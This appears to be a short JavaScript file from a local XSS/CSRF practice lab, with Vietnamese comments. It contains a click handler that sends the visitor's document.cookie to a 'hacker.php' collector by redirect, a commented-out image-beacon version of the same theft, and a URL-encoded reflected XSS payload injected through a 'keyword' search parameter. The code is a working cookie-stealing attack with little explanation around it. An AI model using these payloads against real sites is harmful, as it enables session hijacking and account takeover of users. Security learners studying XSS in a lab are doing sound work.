document.getElementById('hackP').onclick = function () {
    // Gửi cookie về server qua GET request
    // var img = new Image();
    // img.src = 'hacker.php?cookie=' + encodeURIComponent(document.cookie);
    // alert('Cookie đã được gửi về server!');
    window.location='http://localhost/csrf/hacker.php?' + document.cookie;
};

{/* 
<script> 
    window.location='http://localhost/csrf/hacker.php?' + document.cookie;
</script> 

http://localhost/csrf_xss/list_users.php?keyword=%3Cscript%3E%0Awindow.location%3D%27http%3A%2F%2Flocalhost%2Fcsrf_xss%2Fhacker.php%3F%27%2Bdocument.cookie%3B%0A%3C%2Fscript%3E
*/}